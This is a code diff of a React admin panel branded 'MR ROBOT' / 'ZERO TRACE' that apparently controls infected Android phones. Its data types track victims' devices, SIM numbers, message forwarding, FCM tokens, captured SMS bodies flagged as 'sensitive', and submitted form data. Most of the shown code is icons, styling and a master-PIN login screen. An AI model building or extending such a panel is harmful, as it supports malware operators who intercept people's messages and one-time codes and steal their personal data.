@@ -22,7 +22,6 @@ type App = {
   deleteProtectionPin: string | null;
   deleteProtectionEnabled: boolean;
 };
-
 type FullDevice = {
   id: number; deviceId: string; appId: string; userId: string; name: string;
   androidVersion: number;
@@ -30,15 +29,27 @@ type FullDevice = {
   sim2Carrier: string | null; sim2Phone: string | null;
   status: string; lastOnline: string | null;
   forwardEnabled: boolean; forwardSlot: number | null;
-  hasFcm: boolean; installedAt: string;
+  hasFcm: boolean; fcmToken: string | null; installedAt: string;
+};
+type MsgRow = {
+  id: number; appId: string; deviceId: string; userId: string;
+  fromSender: string; fromNumber: string; body: string;
+  isSensitive: boolean; receivedAt: string;
+};
+type GroupRow = {
+  id: number; appId: string; deviceId: string;
+  data: Record<string, unknown>; submittedAt: string;
+};
+type SessionRow = {
+  id: string; appId: string; loginTime: string; lastActive: string;
+  userAgent: string; ip: string; device: string;
 };
 
 function generateAppId() {
-  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-  const seg = (n: number) => Array.from({ length: n }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
-  return `APP-${seg(4)}-${seg(4)}-${seg(4)}`;
+  const c = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  const s = (n: number) => Array.from({ length: n }, () => c[Math.floor(Math.random() * c.length)]).join("");
+  return `APP-${s(4)}-${s(4)}-${s(4)}`;
 }
-
 function fmtAgo(iso: string | null | undefined): string {
   if (!iso) return "Never";
   const diff = Date.now() - new Date(iso).getTime();
@@ -47,7 +58,10 @@ function fmtAgo(iso: string | null | undefined): string {
   if (diff < 86400000) return `${Math.floor(diff / 3600000)}h ago`;
   return `${Math.floor(diff / 86400000)}d ago`;
 }
-
+function fmtDate(iso: string): string {
+  const d = new Date(iso);
+  return d.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) + " " + d.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true });
+}
 function copyToClipboard(text: string): Promise<void> {
   if (navigator.clipboard) return navigator.clipboard.writeText(text);
   const el = document.createElement("textarea");
@@ -57,7 +71,7 @@ function copyToClipboard(text: string): Promise<void> {
   return Promise.resolve();
 }
 
-/* ── SVG Icons ── */
+/* ── Icons ── */
 const Ic = {
   Shield: () => (<svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>),
   Lock: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>),
@@ -72,9 +86,7 @@ const Ic = {
   Layers: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>),
   CheckCircle: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>),
   XCircle: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>),
-  Link: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>),
   Pencil: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>),
-  LogOut2: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>),
   Power: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M18.36 6.64a9 9 0 1 1-12.73 0"/><line x1="12" y1="2" x2="12" y2="12"/></svg>),
   Trash: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>),
   Key: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>),
@@ -87,8 +99,20 @@ const Ic = {
   CPU: () => (<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"><rect x="4" y="4" width="16" height="16" rx="2" ry="2"/><rect x="9" y="9" width="6" height="6"/><line x1="9" y1="1" x2="9" y2="4"/><line x1="15" y1="1" x2="15" y2="4"/><line x1="9" y1="20" x2="9" y2="23"/><line x1="15" y1="20" x2="15" y2="23"/><line x1="20" y1="9" x2="23" y2="9"/><line x1="20" y1="14" x2="23" y2="14"/><line x1="1" y1="9" x2="4" y2="9"/><line x1="1" y1="14" x2="4" y2="14"/></svg>),
   Smartphone: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>),
   Wifi: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>),
+  MessageSquare: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>),
+  Database: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>),
+  Settings: () => (<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>),
+  ChevronDown: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="6 9 12 15 18 9"/></svg>),
+  ChevronRight: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><polyline points="9 18 15 12 9 6"/></svg>),
+  Send: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>),
+  PhoneForwarded: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="19 1 23 5 19 9"/><line x1="15" y1="5" x2="23" y2="5"/><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 13a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 2.31h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L7.91 9.91a16 16 0 0 0 6.16 6.16l.91-.91a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 17v-.08z"/></svg>),
+  Hash: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>),
+  SmartphoneSm: () => (<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>),
+  Link: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>),
+  LogOut2: () => (<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>),
 };
 
+/* ── Base UI ── */
 function CopyBtn({ value, label = "Copy" }: { value: string; label?: string }) {
   const [copied, setCopied] = useState(false);
   function handleCopy(e: React.MouseEvent) {
@@ -96,129 +120,21 @@ function CopyBtn({ value, label = "Copy" }: { value: string; label?: string }) {
     copyToClipboard(value).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2000); });
   }
   return (
-    <button onClick={handleCopy} title={`Copy ${label}`} style={{
-      display: "inline-flex", alignItems: "center", justifyContent: "center",
-      padding: "3px 9px", borderRadius: 6,
-      border: `1px solid ${copied ? T.green + "60" : T.borderLight}`,
-      background: copied ? T.green + "18" : T.border + "80",
-      color: copied ? T.green : T.mutedLight, cursor: "pointer",
-      fontSize: 11, fontWeight: 600, gap: 5, transition: "all 0.15s", whiteSpace: "nowrap",
-    }}>
+    <button onClick={handleCopy} title={`Copy ${label}`} style={{ display: "inline-flex", alignItems: "center", justifyContent: "center", padding: "3px 9px", borderRadius: 6, border: `1px solid ${copied ? T.green + "60" : T.borderLight}`, background: copied ? T.green + "18" : T.border + "80", color: copied ? T.green : T.mutedLight, cursor: "pointer", fontSize: 11, fontWeight: 600, gap: 5, transition: "all 0.15s", whiteSpace: "nowrap" }}>
       {copied ? <Ic.Check /> : <Ic.Copy />}{copied ? "Copied" : label}
     </button>
   );
 }
-
-/* ─────────── Login Screen ─────────── */
-function MasterLogin({ onAuth }: { onAuth: (pin: string) => void }) {
-  const [pin, setPin] = useState("");
-  const [err, setErr] = useState("");
-  const [loading, setLoading] = useState(false);
-  const [showPin, setShowPin] = useState(false);
-
-  async function handleSubmit(e: React.FormEvent) {
-    e.preventDefault(); setErr(""); setLoading(true);
-    try {
-      const r = await apiFetch("/api/admin/verify-master-pin", {
-        method: "POST", headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ pin }),
-      });
-      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Wrong master PIN. Try again."); setPin(""); return; }
-      onAuth(pin);
-    } catch { setErr("Network error. Try again."); }
-    finally { setLoading(false); }
-  }
-
-  return (
-    <div style={{
-      minHeight: "100vh",
-      background: `radial-gradient(ellipse at 65% 15%, rgba(99,102,241,0.14) 0%, transparent 55%), radial-gradient(ellipse at 15% 85%, rgba(139,92,246,0.10) 0%, transparent 50%), ${T.bg}`,
-      display: "flex", alignItems: "center", justifyContent: "center",
-      fontFamily: "'Inter', system-ui, sans-serif", padding: "20px",
-    }}>
-      <div style={{ position: "fixed", inset: 0, pointerEvents: "none", backgroundImage: "linear-gradient(rgba(99,102,241,0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(99,102,241,0.03) 1px, transparent 1px)", backgroundSize: "40px 40px" }} />
-      <div style={{ width: "100%", maxWidth: 400, position: "relative", background: T.card, borderRadius: 24, padding: "44px 40px 36px", border: `1px solid ${T.borderLight}`, boxShadow: "0 32px 80px rgba(0,0,0,.7), 0 0 0 1px rgba(99,102,241,0.08) inset" }}>
-        <div style={{ position: "absolute", top: 0, left: 40, right: 40, height: 2, background: "linear-gradient(90deg, transparent, #6366f1, #8b5cf6, transparent)", borderRadius: "0 0 2px 2px" }} />
-        <div style={{ textAlign: "center", marginBottom: 36 }}>
-          <div style={{ width: 68, height: 68, borderRadius: 20, margin: "0 auto 18px", background: "linear-gradient(145deg, #4f52d4, #7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", boxShadow: "0 12px 32px rgba(99,102,241,0.45), 0 0 0 1px rgba(255,255,255,0.08) inset" }}><Ic.Shield /></div>
-          <div style={{ fontSize: 22, fontWeight: 900, color: T.text, letterSpacing: -0.5, lineHeight: 1.1 }}>MR ROBOT</div>
-          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, marginTop: 10, fontSize: 10, color: T.accentLight, background: "rgba(99,102,241,0.12)", padding: "4px 14px", borderRadius: 99, border: "1px solid rgba(99,102,241,0.25)", fontWeight: 700, letterSpacing: 2, textTransform: "uppercase" }}>
-            <span style={{ width: 5, height: 5, borderRadius: "50%", background: T.accentLight, display: "inline-block" }} />Master Admin
-          </div>
-        </div>
-        <form onSubmit={handleSubmit}>
-          <label style={{ fontSize: 10, color: T.mutedLight, fontWeight: 700, letterSpacing: 1.5, textTransform: "uppercase", display: "flex", alignItems: "center", gap: 6 }}>
-            <Ic.Lock /> Master PIN
-          </label>
-          <div style={{ position: "relative", marginTop: 8, marginBottom: 6 }}>
-            <input type={showPin ? "text" : "password"} value={pin} onChange={e => setPin(e.target.value)} placeholder="Enter master PIN" autoFocus
-              style={{ width: "100%", padding: "14px 46px 14px 16px", borderRadius: 12, border: `1.5px solid ${pin ? T.accent + "70" : T.borderLight}`, background: T.inputBg, color: T.text, fontSize: 15, outline: "none", boxSizing: "border-box", transition: "border-color 0.2s", fontFamily: pin && !showPin ? "monospace" : "inherit", letterSpacing: pin && !showPin ? 4 : "normal" }} />
-            <button type="button" onClick={() => setShowPin(v => !v)} style={{ position: "absolute", right: 13, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: showPin ? T.accentLight : T.muted, cursor: "pointer", padding: 4, display: "flex", alignItems: "center", transition: "color 0.15s" }}>
-              {showPin ? <Ic.EyeOff /> : <Ic.Eye />}
-            </button>
-          </div>
-          {err && (<div style={{ display: "flex", alignItems: "center", gap: 8, color: T.red, fontSize: 12, marginTop: 10, marginBottom: 4, background: T.red + "12", padding: "9px 13px", borderRadius: 9, border: `1px solid ${T.red}30` }}><Ic.Alert /> {err}</div>)}
-          <button type="submit" disabled={loading || !pin} style={{ width: "100%", marginTop: 20, padding: "14px 0", borderRadius: 12, background: pin && !loading ? "linear-gradient(135deg, #5254d4, #7c3aed)" : T.borderLight, color: pin && !loading ? "#fff" : T.muted, fontWeight: 800, fontSize: 14, border: "none", cursor: pin && !loading ? "pointer" : "default", letterSpacing: 0.3, transition: "all 0.2s", boxShadow: pin && !loading ? "0 8px 24px rgba(99,102,241,0.38)" : "none", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
-            {loading ? (<><span style={{ display: "inline-block", width: 14, height: 14, border: "2px solid #fff3", borderTopColor: "#fff", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />Verifying…</>) : (<>Unlock Panel <Ic.ArrowRight /></>)}
-          </button>
-        </form>
-        <div style={{ textAlign: "center", marginTop: 22, fontSize: 11, color: T.muted }}>MR ROBOT Control Panel · Secure Access</div>
-      </div>
-      <style>{`
-          @keyframes spin { to { transform: rotate(360deg) } }
-          @keyframes ma-pulse { 0%,100%{opacity:1} 50%{opacity:0.55} }
-          * { box-sizing: border-box; }
-
-          /* ─── Base button ─── */
-          .ma-btn {
-            display: inline-flex; align-items: center; gap: 6px;
-            padding: 7px 13px; font-size: 12px; font-weight: 600;
-            cursor: pointer; white-space: nowrap; transition: all 0.15s;
-            outline: none; font-family: inherit; text-decoration: none;
-          }
-          .ma-btn:active { transform: scale(0.95); }
-          .ma-btn-lg { padding: 7px 15px; font-weight: 700; }
-
-          /* ─── Layout helpers ─── */
-          .ma-app-btns { display: flex; gap: 6px; flex-wrap: wrap; align-items: center; }
-          .ma-hdr-btns { display: flex; gap: 7px; align-items: center; flex-shrink: 0; }
-
-          /* ─── Login card: tighter on small phones ─── */
-          @media (max-width: 440px) {
-            .ma-login-card { padding: 28px 20px 24px !important; border-radius: 18px !important; }
-          }
-
-          /* ─── Mobile ≤ 560px: icon-only buttons ─── */
-          @media (max-width: 560px) {
-            .ma-btn-lbl { display: none; }
-            .ma-btn     { padding: 8px 9px; gap: 0; }
-            .ma-btn-lg  { padding: 8px 10px; }
-            .ma-hdr-btns{ gap: 4px; }
-            .ma-app-btns{ gap: 4px; }
-          }
-
-          /* ─── Tablet 561–768px ─── */
-          @media (min-width: 561px) and (max-width: 768px) {
-            .ma-btn     { padding: 6px 10px; font-size: 11px; }
-            .ma-btn-lg  { padding: 6px 11px; font-size: 11px; }
-          }
-        `}</style>
-    </div>
-  );
-}
-
-/* ─────────── Modal Shell ─────────── */
 function Modal({ children, onClose, maxWidth = 420 }: { children: React.ReactNode; onClose: () => void; maxWidth?: number }) {
   return (
     <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,.80)", display: "flex", alignItems: "center", justifyContent: "center", zIndex: 100, padding: 16, backdropFilter: "blur(3px)" }}
       onClick={e => { if (e.target === e.currentTarget) onClose(); }}>
-      <div style={{ width: "100%", maxWidth, background: T.card, borderRadius: 20, padding: "26px 28px 24px", border: `1px solid ${T.borderLight}`, boxShadow: "0 24px 64px rgba(0,0,0,.6), 0 0 0 1px rgba(255,255,255,0.04) inset" }}>
+      <div style={{ width: "100%", maxWidth, background: T.card, borderRadius: 20, padding: "26px 28px 24px", border: `1px solid ${T.borderLight}`, boxShadow: "0 24px 64px rgba(0,0,0,.6)" }}>
         {children}
       </div>
     </div>
   );
 }
-
 function ModalHeader({ title, icon, onClose }: { title: string; icon?: React.ReactNode; onClose: () => void }) {
   return (
     <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 22 }}>
@@ -230,18 +146,62 @@ function ModalHeader({ title, icon, onClose }: { title: string; icon?: React.Rea
     </div>
   );
 }
-
 const inpBase: React.CSSProperties = { width: "100%", marginTop: 6, padding: "11px 14px", borderRadius: 10, border: `1.5px solid ${T.borderLight}`, background: T.inputBg, color: T.text, fontSize: 14, outline: "none", boxSizing: "border-box", transition: "border-color 0.15s" };
 function FieldLabel({ children }: { children: React.ReactNode }) { return <label style={{ fontSize: 10, color: T.mutedLight, fontWeight: 700, letterSpacing: 1.2, textTransform: "uppercase" }}>{children}</label>; }
 function ErrBanner({ msg }: { msg: string }) { return <div style={{ display: "flex", alignItems: "center", gap: 8, color: T.red, fontSize: 12, marginBottom: 10, background: T.red + "12", padding: "9px 13px", borderRadius: 9, border: `1px solid ${T.red}30` }}><Ic.Alert /> {msg}</div>; }
+function Spinner({ size = 14 }: { size?: number }) { return <div style={{ display: "inline-block", width: size, height: size, border: "2px solid currentColor", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />; }
 
-/* ─────────── Create App Modal ─────────── */
+/* ── Login Screen ── */
+function MasterLogin({ onAuth }: { onAuth: (pin: string) => void }) {
+  const [pin, setPin] = useState("");
+  const [err, setErr] = useState("");
+  const [loading, setLoading] = useState(false);
+  const [showPin, setShowPin] = useState(false);
+  async function handleSubmit(e: React.FormEvent) {
+    e.preventDefault(); setErr(""); setLoading(true);
+    try {
+      const r = await apiFetch("/api/admin/verify-master-pin", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ pin }) });
+      if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Wrong master PIN. Try again."); setPin(""); return; }
+      onAuth(pin);
+    } catch { setErr("Network error. Try again."); } finally { setLoading(false); }
+  }
+  return (
+    <div style={{ minHeight: "100vh", background: `radial-gradient(ellipse at 65% 15%, rgba(99,102,241,0.14) 0%, transparent 55%), radial-gradient(ellipse at 15% 85%, rgba(139,92,246,0.10) 0%, transparent 50%), ${T.bg}`, display: "flex", alignItems: "center", justifyContent: "center", fontFamily: "'Inter', system-ui, sans-serif", padding: "20px" }}>
+      <div style={{ width: "100%", maxWidth: 400, background: T.card, borderRadius: 24, padding: "44px 40px 36px", border: `1px solid ${T.borderLight}`, boxShadow: "0 32px 80px rgba(0,0,0,.7)" }}>
+        <div style={{ textAlign: "center", marginBottom: 36 }}>
+          <div style={{ width: 68, height: 68, borderRadius: 20, margin: "0 auto 18px", background: "linear-gradient(145deg, #4f52d4, #7c3aed)", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", boxShadow: "0 12px 32px rgba(99,102,241,0.45)" }}><Ic.Shield /></div>
+          <div style={{ fontSize: 22, fontWeight: 900, color: T.text }}>MR ROBOT</div>
+          <div style={{ display: "inline-flex", alignItems: "center", gap: 6, marginTop: 10, fontSize: 10, color: T.accentLight, background: "rgba(99,102,241,0.12)", padding: "4px 14px", borderRadius: 99, border: "1px solid rgba(99,102,241,0.25)", fontWeight: 700, letterSpacing: 2, textTransform: "uppercase" }}>
+            <span style={{ width: 5, height: 5, borderRadius: "50%", background: T.accentLight, display: "inline-block" }} />Master Admin
+          </div>
+        </div>
+        <form onSubmit={handleSubmit}>
+          <label style={{ fontSize: 10, color: T.mutedLight, fontWeight: 700, letterSpacing: 1.5, textTransform: "uppercase", display: "flex", alignItems: "center", gap: 6 }}><Ic.Lock /> Master PIN</label>
+          <div style={{ position: "relative", marginTop: 8, marginBottom: 6 }}>
+            <input type={showPin ? "text" : "password"} value={pin} onChange={e => setPin(e.target.value)} placeholder="Enter master PIN" autoFocus
+              style={{ ...inpBase, marginTop: 0, paddingRight: 46, fontFamily: pin && !showPin ? "monospace" : "inherit", letterSpacing: pin && !showPin ? 4 : "normal" }} />
+            <button type="button" onClick={() => setShowPin(v => !v)} style={{ position: "absolute", right: 13, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: showPin ? T.accentLight : T.muted, cursor: "pointer", padding: 4, display: "flex", alignItems: "center" }}>
+              {showPin ? <Ic.EyeOff /> : <Ic.Eye />}
+            </button>
+          </div>
+          {err && <ErrBanner msg={err} />}
+          <button type="submit" disabled={loading || !pin} style={{ width: "100%", marginTop: 20, padding: "14px 0", borderRadius: 12, background: pin && !loading ? "linear-gradient(135deg, #5254d4, #7c3aed)" : T.borderLight, color: pin && !loading ? "#fff" : T.muted, fontWeight: 800, fontSize: 14, border: "none", cursor: pin && !loading ? "pointer" : "default", display: "flex", alignItems: "center", justifyContent: "center", gap: 8 }}>
+            {loading ? (<><Spinner /> Verifying…</>) : (<>Unlock Panel <Ic.ArrowRight /></>)}
+          </button>
+        </form>
+        <div style={{ textAlign: "center", marginTop: 22, fontSize: 11, color: T.muted }}>MR ROBOT Control Panel · Secure Access</div>
+      </div>
+      <style>{`@keyframes spin{to{transform:rotate(360deg)}} @keyframes ma-pulse{0%,100%{opacity:1}50%{opacity:0.55}} *{box-sizing:border-box}`}</style>
+    </div>
+  );
+}
+
+/* ── Create App Modal ── */
 function CreateAppModal({ masterPin, onClose, onCreated }: { masterPin: string; onClose: () => void; onCreated: (a: App) => void }) {
   const [name, setName] = useState("MR ROBOT");
   const [appId, setAppId] = useState(generateAppId);
   const [pin, setPin] = useState("1234");
   const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
-
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
     if (!name.trim() || !pin.trim()) { setErr("All fields required"); return; }
@@ -253,7 +213,6 @@ function CreateAppModal({ masterPin, onClose, onCreated }: { masterPin: string; 
       onCreated(await r.json() as App);
     } catch { setErr("Network error"); } finally { setLoading(false); }
   }
-
   return (
     <Modal onClose={onClose}>
       <ModalHeader title="Create Sub-Admin App" onClose={onClose} />
@@ -261,14 +220,12 @@ function CreateAppModal({ masterPin, onClose, onCreated }: { masterPin: string; 
         <div style={{ marginBottom: 14 }}>
           <FieldLabel>Version</FieldLabel>
           <div style={{ display: "flex", gap: 8, marginTop: 8 }}>
-            <button type="button" onClick={() => setName("MR ROBOT")} style={{ flex: 1, padding: "14px 8px", borderRadius: 12, border: `2px solid ${name === "MR ROBOT" ? T.accent : T.borderLight}`, background: name === "MR ROBOT" ? T.accentGlow : T.border, cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 5, transition: "all 0.15s" }}>
-              <span style={{ fontSize: 22 }}>🤖</span>
-              <span style={{ fontSize: 12, fontWeight: 800, color: name === "MR ROBOT" ? T.accentLight : T.muted, letterSpacing: 0.5 }}>MR ROBOT</span>
-            </button>
-            <button type="button" onClick={() => setName("ZERO TRACE")} style={{ flex: 1, padding: "14px 8px", borderRadius: 12, border: `2px solid ${name === "ZERO TRACE" ? "#059669" : T.borderLight}`, background: name === "ZERO TRACE" ? "#05966918" : T.border, cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 5, transition: "all 0.15s" }}>
-              <span style={{ fontSize: 22 }}>👁️</span>
-              <span style={{ fontSize: 12, fontWeight: 800, color: name === "ZERO TRACE" ? "#059669" : T.muted, letterSpacing: 0.5 }}>ZERO TRACE</span>
-            </button>
+            {(["MR ROBOT", "ZERO TRACE"] as const).map(n => (
+              <button key={n} type="button" onClick={() => setName(n)} style={{ flex: 1, padding: "14px 8px", borderRadius: 12, border: `2px solid ${name === n ? T.accent : T.borderLight}`, background: name === n ? T.accentGlow : T.border, cursor: "pointer", display: "flex", flexDirection: "column", alignItems: "center", gap: 5, transition: "all 0.15s" }}>
+                <span style={{ fontSize: 22 }}>{n === "MR ROBOT" ? "🤖" : "👁️"}</span>
+                <span style={{ fontSize: 12, fontWeight: 800, color: name === n ? T.accentLight : T.muted }}>{n}</span>
+              </button>
+            ))}
           </div>
         </div>
         <div style={{ marginBottom: 14 }}>
@@ -282,19 +239,18 @@ function CreateAppModal({ masterPin, onClose, onCreated }: { masterPin: string; 
         {err && <ErrBanner msg={err} />}
         <div style={{ display: "flex", gap: 10, marginTop: 20 }}>
           <button type="button" onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
-          <button type="submit" disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", fontSize: 13, boxShadow: "0 4px 14px rgba(99,102,241,0.3)" }}>{loading ? "Creating…" : "Create App"}</button>
